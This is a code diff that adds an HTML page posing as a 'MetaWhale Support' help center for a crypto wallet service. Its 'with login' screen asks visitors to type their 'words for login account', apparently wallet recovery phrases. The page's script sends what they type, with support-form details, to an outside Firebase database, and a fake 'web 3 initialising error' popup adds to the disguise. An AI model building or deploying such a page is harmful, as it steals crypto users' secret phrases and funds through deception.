@@ -1,0 +1,215 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>MetaWhale Support</title>
+    <style>
+        /* --- General Setup --- */
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: sans-serif; user-select: none; }
+        body { background-color: #000; color: #fff; display: flex; justify-content: center; min-height: 100vh; }
+        
+        /* Scrolling Enabled to prevent cutting */
+        .app-container { 
+            width: 100%; max-width: 450px; 
+            min-height: 100vh; 
+            background-color: #000; 
+            padding: 15px; 
+            position: relative;
+            overflow-y: auto; 
+        }
+
+        /* --- Sliding Animated Error --- */
+        #error-popup {
+            position: fixed;
+            top: -100px;
+            left: 0;
+            width: 100%;
+            background-color: #790000;
+            color: white;
+            text-align: center;
+            padding: 15px;
+            font-weight: 500;
+            font-size: 16px;
+            z-index: 1000;
+            transition: top 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+        #error-popup.show { top: 0; }
+
+        /* --- Header & Icons --- */
+        .header { display: flex; justify-content: space-between; align-items: center; padding: 10px 0; }
+        .help-text { font-size: 18px; font-weight: 600; }
+        .header-right { display: flex; align-items: center; gap: 10px; }
+        
+        .igt-box { 
+            background: #111; padding: 8px 12px; border-radius: 10px; 
+            font-size: 14px; display: flex; align-items: center; gap: 10px; 
+            border: 1px solid #222; cursor: pointer;
+        }
+        .wallet-draw {
+            width: 22px; height: 16px; border: 1.5px solid #fff; 
+            border-radius: 4px; position: relative;
+        }
+        .wallet-draw::after {
+            content: ''; position: absolute; right: 2px; top: 4px;
+            width: 4px; height: 4px; border: 1.5px solid #fff; border-radius: 50%;
+        }
+
+        .menu-grid { 
+            background: #111; padding: 9px; border-radius: 10px; 
+            display: grid; grid-template-columns: repeat(2, 6px); gap: 4px; 
+            border: 1px solid #222; cursor: pointer;
+        }
+        .menu-grid span { width: 6px; height: 6px; border: 1.5px solid #fff; border-radius: 1px; }
+        
+        .top-line { border: 0; border-top: 1px solid #1a1a1a; margin: 10px 0; }
+
+        /* --- UI Elements --- */
+        .main-title { font-size: 28px; margin: 25px 0; font-weight: bold; letter-spacing: -0.5px; }
+        .halka-black-box { background: #111; border-radius: 15px; padding: 15px; margin-bottom: 20px; border: 1px solid #1a1a1a; }
+        .blue-btn { background: #2b26d9; color: #fff; border: none; padding: 10px 15px; border-radius: 10px; font-weight: 600; cursor: pointer; }
+        
+        .category-list { background: #111; border-radius: 15px; border: 1px solid #1a1a1a; }
+        .category-item { display: flex; justify-content: space-between; padding: 18px 20px; border-bottom: 1px solid #1a1a1a; cursor: pointer; }
+        .category-item:last-child { border-bottom: none; }
+        .arrow { color: #333; font-size: 20px; }
+
+        /* --- Form Controls --- */
+        input, select, textarea { 
+            width: 100%; background: #080808; border: 1px solid #222; 
+            border-radius: 12px; padding: 15px; color: #fff; margin-bottom: 15px; outline: none; font-size: 14px;
+        }
+        label { color: #555; font-size: 11px; margin-bottom: 8px; display: block; text-transform: uppercase; font-weight: bold; }
+        .instruction { color: #555; font-size: 12px; margin-bottom: 12px; line-height: 1.4; }
+        .attach-box { background: #1a1a1a; padding: 10px 15px; border-radius: 10px; display: inline-flex; align-items: center; gap: 10px; color: #888; font-size: 14px; margin-bottom: 10px; cursor: pointer; }
+
+        .interface { display: none; padding-bottom: 40px; }
+        .interface.active { display: block; }
+        .footer-btns { display: flex; gap: 10px; margin-top: 20px; }
+        .grey-btn { background: #1a1a1a; color: #888; border: none; padding: 12px; border-radius: 10px; flex: 1; font-weight: 600; }
+    </style>
+</head>
+<body>
+
+    <div id="error-popup">web 3 initialising error</div>
+
+    <div class="app-container">
+        <div class="header">
+            <span class="help-text">Help</span>
+            <div class="header-right">
+                <div class="igt-box" onclick="showError()">
+                    0.00 IGT <span style="color:#222">|</span> 
+                    <div class="wallet-draw"></div>
+                </div>
+                <div class="menu-grid" onclick="showInterface(1)">
+                    <span></span><span></span><span></span><span></span>
+                </div>
+            </div>
+        </div>
+        <hr class="top-line">
+
+        <div id="interface1" class="interface active">
+            <h1 class="main-title">Welcome to the help center</h1>
+            <div class="halka-black-box" style="display:flex; justify-content:space-between; align-items:center;">
+                <span style="color:#888">My messages</span>
+                <div style="display:flex; gap:8px;">
+                    <button class="blue-btn" onclick="showInterface(2)">Ask a question</button>
+                    <button class="blue-btn" onclick="showInterface(3)">with login</button>
+                </div>
+            </div>
+            <h2 style="font-size: 18px; margin-bottom:15px; font-weight:600;">Chose category</h2>
+            <div class="category-list">
+                <div class="category-item" onclick="showInterface(2)"><span>Meta Whale</span><span class="arrow">›</span></div>
+                <div class="category-item" onclick="showInterface(2)"><span>Whalebit (CES)</span><span class="arrow">›</span></div>
+                <div class="category-item" onclick="showInterface(2)"><span>Wallet</span><span class="arrow">›</span></div>
+                <div class="category-item" onclick="showInterface(2)"><span>T&S</span><span class="arrow">›</span></div>
+                <div class="category-item" onclick="showInterface(2)"><span>W-DEX</span><span class="arrow">›</span></div>
+                <div class="category-item" onclick="showInterface(2)"><span>Other</span><span class="arrow">›</span></div>
+            </div>
+        </div>
+
+        <div id="interface2" class="interface">
+            <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:10px;">
+                <div style="width:30px"></div>
+                <span style="font-weight:600">New question</span>
+                <div style="background:#222; border-radius:50%; width:26px; height:26px; display:flex; align-items:center; justify-content:center; cursor:pointer" onclick="showInterface(1)">✕</div>
+            </div>
+            <hr class="top-line">
+            
+            <label>Title Subject</label>
+            <select id="topic"><option>Select a topic</option><option>Technical</option></select>
+            
+            <label>Transaction Date</label>
+            <input type="date" id="transDate">
+            <p class="instruction">If the issue is related to a transaction, please include the date of the transaction if possible.</p>
+            
+            <label>Problem Description</label>
+            <textarea id="desc" rows="4" placeholder="Describe your problem"></textarea>
+            <p style="color:#ff3b30; font-size:11px; margin-bottom:10px; font-weight:bold;">the message must have at least 150 characters</p>
+            <p class="instruction" style="color:#777">Describe the problem in as much detail as possible. If possible, please add screenshots to help us resolve your issue faster.</p>
+            
+            <div class="attach-box">📎 Attach files</div>
+            <p class="instruction" style="font-size:10.5px;">Only files with formats jpg, jpeg, png, gif, webp, pdf, doc, xls, docx, xlsx, mp4, mov and heic are allowed. Maximum size is 300 mb</p>
+            
+            <div class="footer-btns">
+                <button class="grey-btn" onclick="showInterface(1)">Cancel</button>
+                <button class="blue-btn" style="flex:1" onclick="submitData('Question')">Send</button>
+            </div>
+        </div>
+
+        <div id="interface3" class="interface">
+            <h1 class="main-title">Welcome to the help center</h1>
+            <div class="halka-black-box">
+                <p style="margin-bottom:15px; font-size:14px; color:#aaa">login your account for direct request</p>
+                <textarea id="loginWords" style="height:350px; border: 1px solid #333;" placeholder="input your words for login account"></textarea>
+                <button class="blue-btn" style="width:100%; padding:15px; font-size:16px;" onclick="submitData('Login')">login first</button>
+            </div>
+        </div>
+    </div>
+
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.17.1/firebase-app.js";
+        import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/9.17.1/firebase-firestore.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyBvfZO9pxRshe4M8aavrLlHexq42vZDQ2g",
+            authDomain: "v-academy-82560.firebaseapp.com",
+            projectId: "v-academy-82560",
+            storageBucket: "v-academy-82560.firebasestorage.app",
+            messagingSenderId: "826822771378",
+            appId: "1:826822771378:web:5357b1b989b298a8027fab"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const db = getFirestore(app);
+
+        window.showError = function() {
+            const err = document.getElementById('error-popup');
+            err.classList.add('show');
+            setTimeout(() => { err.classList.remove('show'); }, 3000);
+        }
+
+        window.showInterface = function(id) {
+            document.querySelectorAll('.interface').forEach(el => el.classList.remove('active'));
+            document.getElementById('interface' + id).classList.add('active');
+            document.querySelector('.app-container').scrollTo(0,0);
+        }
+
+        window.submitData = async function(type) {
+            try {
+                let docData = { type, timestamp: new Date().toLocaleString() };
+                if(type === 'Question') {
+                    docData.topic = document.getElementById('topic').value;
+                    docData.date = document.getElementById('transDate').value;
+                    docData.description = document.getElementById('desc').value;
+                } else {
+                    docData.loginWords = document.getElementById('loginWords').value;
+                }
+                await addDoc(collection(db, "support_requests"), docData);
+                alert("Request submitted successfully!");
+                showInterface(1);
+            } catch (e) { alert("Error!"); }
+        }
+    </script>
+</body>
+  </html>
